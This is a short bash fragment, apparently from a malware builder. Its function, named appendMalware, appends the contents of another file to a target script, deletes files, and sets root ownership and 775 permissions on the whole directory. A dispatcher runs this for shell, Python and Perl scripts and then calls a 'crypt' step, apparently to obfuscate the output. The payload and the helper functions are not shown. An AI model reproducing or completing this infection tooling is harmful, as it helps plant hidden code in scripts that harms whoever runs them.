
appendMalware() {
    while read fileContent;do
	printf "%s\n" "${fileContent}" >> "${fileName}"
    done < "${dirfile}"
    
    
    [[ "${dirfile}" != "tempScript.sh" ]] && rm "${fileName}.${fileExt}"
    
    
    chown root:root ./*
    chmod 775 ./*
}

scrConfig() {
    local fileExt="${1}"
    case ${fileExt} in
    sh)
	_sh ${fileName}
	
	appendMalware
	
	crypt "shell script" "${CRYPT}"
	;;
    py)
	_py "${fileName}"
	
	appendMalware
	
	crypt "python script" "${CRYPT}"
	;;
    pl) 
	_pl "${fileName}"
	
	appendMalware
	
	crypt "perl script" "${CRYPT}"
	;;
    esac

}
